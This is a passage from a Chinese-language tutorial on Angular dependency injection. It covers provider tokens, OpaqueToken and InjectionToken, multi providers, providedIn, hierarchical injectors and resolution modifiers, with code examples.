</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>然而，config 是一个很通用的名字，这样的话就可能在项目中留下隐患。因为若在项目中也存在同样名称的 provider，那么后面声明的 provider 将会覆盖之前声明的 provider。</p> <p>假设在项目中，我们引入了第三方脚本库。该库的 provides 的配置信息如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">THIRDPARTYLIBPROVIDERS</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span> provide<span class="token operator">:</span> <span class="token string">'config'</span><span class="token punctuation">,</span> useClass<span class="token operator">:</span> ThirdParyConfig <span class="token punctuation">}</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>实际使用时，我们可能这样做：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token constant">THIRDPARTYLIBPROVIDERS</span> <span class="token keyword">from</span> <span class="token string">'./third-party-lib'</span><span class="token punctuation">;</span>
providers <span class="token operator">=</span> <span class="token punctuation">[</span>
  DataService<span class="token punctuation">,</span>
  <span class="token constant">THIRDPARTYLIBPROVIDERS</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>到目前为止，一切都能正常工作。但我们是不知道 THIRDPARTYLIBPROVIDERS 内部的具体情况，除非我们已经阅读了第三方库的官方文档或源码。在未知的情况下，我们可能这样使用：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>providers <span class="token operator">=</span> <span class="token punctuation">[</span>
  DataService<span class="token punctuation">,</span>
  <span class="token constant">THIRDPARTYLIBPROVIDERS</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span> provide<span class="token operator">:</span> configToken<span class="token punctuation">,</span> useValue<span class="token operator">:</span> <span class="token constant">CONFIG</span> <span class="token punctuation">}</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>此时第三方库就不能正常工作了。因为它获取不到它所依赖的配置对象，因为它被我们自定义的 provider 替换了。</p> <h3 id="opaquetoken"><a href="#opaquetoken" class="header-anchor">#</a> OpaqueToken</h3> <p>为了解决上述问题，Angular 2 引入了 OpaqueToken，它允许我们创建基于字符串的 Token 类。创建 OpaqueToken 对象很简单，只需导入 Opaque 类。这样的话，上面提到的第三方类库，可以调整为：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> OpaqueToken <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">CONFIG_TOKEN</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OpaqueToken</span><span class="token punctuation">(</span><span class="token string">'config'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">THIRDPARTYLIBPROVIDERS</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span> provide<span class="token operator">:</span> <span class="token constant">CONFIG_TOKEN</span><span class="token punctuation">,</span> useClass<span class="token operator">:</span> ThirdPartyConfig <span class="token punctuation">}</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>而之前提到的冲突问题，也可以按照下面的方式解决。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> OpaqueToken <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token constant">THIRDPARTYLIBPROVIDERS</span> <span class="token keyword">from</span> <span class="token string">'./third-party-lib'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">MY_CONFIG_TOKEN</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OpaqueToken</span><span class="token punctuation">(</span><span class="token string">'config'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
providers <span class="token operator">=</span> <span class="token punctuation">[</span>
  DataService<span class="token punctuation">,</span>
  <span class="token constant">THIRDPARTYLIBPROVIDERS</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span> provide<span class="token operator">:</span> <span class="token constant">MY_CONFIG_TOKEN</span><span class="token punctuation">,</span> useValue<span class="token operator">:</span> <span class="token constant">CONFIG</span> <span class="token punctuation">}</span>
<span class="token punctuation">]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>OpaqueToken 的工作原理</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// OpaqueToken - @angular/core/src/di/injection_token.ts</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">OpaqueToken</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">protected</span> _desc<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> string <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Token </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>_desc<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">;</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>通过查看 OpaqueToken 类，我们可以发现，尽管是使用相同的字符串去创建 OpaqueToken 实例对象，但每次都是返回一个新的实例，从而保证了全局的唯一性。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token constant">TOKEN_A</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OpaqueToken</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">TOKEN_B</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OpaqueToken</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token constant">TOKEN_A</span> <span class="token operator">===</span> <span class="token constant">TOKEN_B</span> <span class="token comment">// false</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>让我们再看一下示例中 DataService Provider 配置信息：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token constant">API_URL</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OpaqueToken</span><span class="token punctuation">(</span><span class="token string">'apiUrl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
providers<span class="token operator">:</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span>
    provide<span class="token operator">:</span> DataService<span class="token punctuation">,</span>
    <span class="token function-variable function">useFactory</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">http<span class="token punctuation">,</span> apiUrl</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token comment">// create data service</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    deps<span class="token operator">:</span> <span class="token punctuation">[</span>
      Http<span class="token punctuation">,</span>
      <span class="token keyword">new</span> <span class="token class-name">Inject</span><span class="token punctuation">(</span><span class="token constant">API_URL</span><span class="token punctuation">)</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>我们使用工厂函数创建 DataService 实例，DataService 依赖 http 和 apiUrl 对象，为了让 Angular 能够准确地注入依赖对象，我们使用 deps 属性声明依赖对象的类型。因为 Http 是 Type 类型的 Token，我们只需直接声明。但 API_URL 是 OpaqueToken 类的实例，不属于 Type 类型。因此我们需要使用 new Inject(API_URL) 方式声明依赖对象。(备注：new Inject()与在构造函数中使用 @Inject() 的方式声明依赖对象是等价的)。</p> <p>上面的代码能够正常运行，但在实际开发过程中，开发者很容易忘记调用 new Inject()。为了解决这个问题，Angular 团队引入了 InjectionToken。</p> <h3 id="injectiontoken"><a href="#injectiontoken" class="header-anchor">#</a> InjectionToken</h3> <p>注意Angular 4.x后才有InjectionToken</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// InjectionToken - @angular/core/src/di/injection_token.ts</span>
<span class="token comment">/**
* InjectionToken 继承于 OpaqueToken，同时支持泛型,用于描述依赖对象的类型
*
*/</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">InjectionToken</span><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span> <span class="token keyword">extends</span> <span class="token class-name">OpaqueToken</span> <span class="token punctuation">{</span>
  <span class="token keyword">private</span> _differentiate_from_OpaqueToken_structurally<span class="token operator">:</span> any<span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">desc<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">super</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>
  
  <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> string <span class="token punctuation">{</span> 
     <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">InjectionToken </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>_desc<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">;</span><span class="token template-punctuation string">`</span></span> 
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>使用 InjectionToken 重写上面的示例：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// InjectionToken&lt;T&gt; - 使用泛型描述该Token所关联的依赖对象的类型</span>
<span class="token keyword">const</span> <span class="token constant">API_URL</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InjectionToken</span><span class="token operator">&lt;</span>string<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token string">'apiUrl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
providers<span class="token operator">:</span> <span class="token punctuation">[</span>
  <span class="token punctuation">{</span>
    provide<span class="token operator">:</span> DataService<span class="token punctuation">,</span>
    <span class="token function-variable function">useFactory</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">http<span class="token punctuation">,</span> apiUrl</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token comment">// create data service</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    deps<span class="token operator">:</span> <span class="token punctuation">[</span>
      Http<span class="token punctuation">,</span>
      <span class="token constant">API_URL</span> <span class="token comment">// no `new Inject()` needed!</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h3 id="multi-providers"><a href="#multi-providers" class="header-anchor">#</a> multi providers</h3> <p>Multi providers 让我们可以使用相同的 Token 去注册多个 Provider ，具体如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> <span class="token constant">SOME_TOKEN</span><span class="token operator">:</span> OpaqueToken <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OpaqueToken</span><span class="token punctuation">(</span><span class="token string">'SomeToken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> injector <span class="token operator">=</span> ReflectiveInjector<span class="token punctuation">.</span><span class="token function">resolveAndCreate</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
  <span class="token function">provide</span><span class="token punctuation">(</span><span class="token constant">SOME_TOKEN</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>useValue<span class="token operator">:</span> <span class="token string">'dependency one'</span><span class="token punctuation">,</span> multi<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token function">provide</span><span class="token punctuation">(</span><span class="token constant">SOME_TOKEN</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>useValue<span class="token operator">:</span> <span class="token string">'dependency two'</span><span class="token punctuation">,</span> multi<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// dependencies == ['dependency one', 'dependency two']</span>
<span class="token keyword">var</span> dependencies <span class="token operator">=</span> injector<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token constant">SOME_TOKEN</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>上面例子中，我们使用 multi: true 告诉 Angular 2的依赖注入系统，我们设置的 provider 是 multi provider。正如之前所说，我们可以使用相同的 token 值，注册不同的 provide。当我们使用对应的 token 去获取依赖项时，我们获取的是已注册的依赖对象列表。</p> <p>若没有设置 multi: true 属性时，使用同一个 token 注册 provider 时</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">Engine</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">TurboEngine</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>

<span class="token keyword">var</span> injector <span class="token operator">=</span> ReflectiveInjector<span class="token punctuation">.</span><span class="token function">resolveAndCreate</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
  <span class="token function">provide</span><span class="token punctuation">(</span>Engine<span class="token punctuation">,</span> <span class="token punctuation">{</span>useClass<span class="token operator">:</span> Engine<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token function">provide</span><span class="token punctuation">(</span>Engine<span class="token punctuation">,</span> <span class="token punctuation">{</span>useClass<span class="token operator">:</span> TurboEngine<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> engine <span class="token operator">=</span> injector<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>Engine<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// engine instanceof TurboEngine == true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>这说明如果使用同一个 token 注册 provider，后面注册的 provider 将会覆盖前面已注册的 provider。另外需要注意的是，multi provider是不能和普通的 provider 混用。</p> <h3 id="providedin"><a href="#providedin" class="header-anchor">#</a> providedIn</h3> <p>在Angular中使用ng g service 服务名称命令之后生成的初始代码为：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>@Injectable({
  providedIn: 'root'
})
export class HttpService {
  constructor() { }
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>@Injectable()装饰器是每个 Angular 服务定义中的基本要素，它把与之相邻的类标记为可供注入的服务，在@Injectable()中有一个providedIn的元数据选项，它的值为root，表明这个类在顶层提供服务，这么定义之后就不需要将它添加到根模块的提供者中。这个元数据选项的值不一定非得为root，可以根据自己的需要修改，如果指定这个服务提供给哪个具体的类，那么需要将这个服务类注册到根模块的提供者providers中。放到中间服务有利于摇树。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providedIn<span class="token operator">:</span> ServicesModule <span class="token comment">//《---</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment">// service.module.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>NgModule<span class="token punctuation">,</span> InjectionToken<span class="token punctuation">,</span> <span class="token constant">PLATFORM_ID</span><span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>environment<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../../environments/environment'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span><span class="token constant">HTTP_INTERCEPTORS</span><span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common/http'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>BaseInterceptor<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'core/interceptor/base.interceptor'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>isPlatformBrowser<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common'</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">API_CONFIG</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InjectionToken</span><span class="token punctuation">(</span><span class="token string">'ApiConfigToken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token constant">WINDOW</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InjectionToken</span><span class="token punctuation">(</span><span class="token string">'windowToken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">NgModule</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providers<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>provide<span class="token operator">:</span> <span class="token constant">API_CONFIG</span><span class="token punctuation">,</span> useValue<span class="token operator">:</span> environment<span class="token punctuation">.</span>production <span class="token operator">?</span> <span class="token string">'/'</span> <span class="token operator">:</span> <span class="token string">'/api/'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
      provide<span class="token operator">:</span> <span class="token constant">WINDOW</span><span class="token punctuation">,</span> <span class="token function">useFactory</span><span class="token punctuation">(</span><span class="token parameter">platformId<span class="token operator">:</span> object</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">isPlatformBrowser</span><span class="token punctuation">(</span>platformId<span class="token punctuation">)</span> <span class="token operator">?</span> window <span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      deps<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token constant">PLATFORM_ID</span><span class="token punctuation">]</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>provide<span class="token operator">:</span> <span class="token constant">HTTP_INTERCEPTORS</span><span class="token punctuation">,</span> useClass<span class="token operator">:</span> BaseInterceptor<span class="token punctuation">,</span> multi<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ServicesModule</span> <span class="token punctuation">{</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><h2 id="依赖注入原理-多级注入器"><a href="#依赖注入原理-多级注入器" class="header-anchor">#</a> 依赖注入原理/多级注入器</h2> <p>Angular 有一个多级依赖注入系统。 应用程序中有一个与组件树平行的注入器树,平行是指结构完全相同且一一对应。我们可以在组件树中的任何级别上重新配置注入器。实际上，没有那个（唯一的）注入器这回事，一个应用中可能有多个注入器。 一个 Angular 应用是一个组件树。每个组件实例都有自己的注入器， 组件的树与注入器的树平行。</p> <div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>组件的注入器可能是一个组件树中更高级的祖先注入器的代理。 但这只是提升效率的实现细节，我们不用在乎这点差异，在你的脑海里只要想象成每个组件都有自己的注入器就可以了。</p></div> <p>Angular中的注入器有一些规则，你可以利用这些规则来在应用程序中获得所需的可注入对象可见性。通俗的讲，这些规则指定了注入器的“作用域&quot;。</p> <p>除了模块注入器和组件注入器，Angular 还提供了第三种注入器，即多级元素注入器，它是由 HTML 元素和指令共同创建的。</p> <p>Angular 会按照三个阶段来解析依赖，起始阶段就是使用多级元素注入器，然后是多级组件注入器，最后是多级模块注入器。</p> <h3 id="注入器冒泡"><a href="#注入器冒泡" class="header-anchor">#</a> 注入器冒泡</h3> <p>当一个组件申请获得一个依赖时，Angular 先尝试用该组件自己的注入器来满足它。 如果该组件的注入器没有找到对应的提供商，它就把这个申请转给它父组件的注入器来处理。 如果那个注入器也无法满足这个申请，它就继续转给它的父组件的注入器。 这个申请继续往上冒泡 —— 直到我们找到了一个能处理此申请的注入器或者超出了组件树中的祖先位置为止。 如果超出了组件树中的祖先还未找到，Angular 就会抛出一个错误。</p> <div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>我们还可以“盖住”这次冒泡。一个中层的组件可以声称自己是“宿主”组件。 向上查找提供商的过程会截止于这个“宿主”组件。</p></div> <h3 id="低层级覆盖上层级服务"><a href="#低层级覆盖上层级服务" class="header-anchor">#</a> 低层级覆盖上层级服务</h3> <p>可以在注入器树的不同层级里为特殊的服务单独的重写和覆盖服务提供商。基于这个我们常常使用的两种情况：</p> <ul><li>服务隔离
我们通过在组件的元数据中提供服务来达到我们获取数据的目的，而在其他地方访问会不可用，该服务仅能在该组件及其子组件树中可用。 不过它仍然是个单例，但是这个单例，也仅存在于该组件的领域中。一般用来封装公用的组件。</li> <li>多个并行服务
每个组件的实例都有自己的注入器。 在组件级别提供服务确保组件的每个实例都获得其自己的该服务的私有实例。</li> <li>专业服务
重新提供服务的另一个原因是在组件树中更深入地替将该服务替换成更专业的实现。</li></ul> <h3 id="两个注入器层次结构"><a href="#两个注入器层次结构" class="header-anchor">#</a> 两个注入器层次结构</h3> <p>Angular中有两个注入器层次结构：</p> <ul><li>ModuleInjector层次结构 —— 在 @NgModule()或 @Injectable()中提供的服务。</li> <li>ElementInjector层次结构 —— 在 @Directive()或 @Component()中提供的服务。</li></ul> <h3 id="服务查找规则-令牌解析规则"><a href="#服务查找规则-令牌解析规则" class="header-anchor">#</a> 服务查找规则(令牌解析规则)</h3> <ul><li>优先查找ElementInjector，如果当前组件找不到提供者，将会去父组件中的ElementInjector</li> <li>当所有的ElementInjector都找不到，就会去ModuleInjector中找</li> <li>如果ModuleInjector也找不到，就会抛出一个错误</li> <li>对于同名的令牌，只会解析遇到的第一个依赖</li></ul> <h3 id="注入解析修饰符"><a href="#注入解析修饰符" class="header-anchor">#</a> 注入解析修饰符</h3> <p>默认情况下，Angular始终从当前的 Injector开始，并一直向上搜索。但修饰符使你可以更改开始（默认是自己）或结束位置。比如：</p> <ul><li>如果 Angular找不到你要的服务怎么办，用 @Optional()阻止报错</li> <li>用 @SkipSelf()跳过自身，从父组件(指令)开始找</li> <li>用 @Self() 只在当前组件(指令)找</li> <li>用 @Host() 只在当前组件(指令)宿主上找</li></ul> <p>我们将创建一个logger组件和一个logger服务来验证上面的规则：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// logger.service.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Injectable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">LoggerService</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
  <span class="token function">log</span><span class="token punctuation">(</span><span class="token parameter">message<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// logger.component.ts</span>
<span class="token operator">...</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'app-logger'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;p&gt;logger works!&lt;/p&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
  changeDetection<span class="token operator">:</span> ChangeDetectionStrategy<span class="token punctuation">.</span>OnPush<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">LoggerComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> loggerservice<span class="token operator">:</span> LoggerService</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>loggerservice<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'这是组件内打印的日志'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
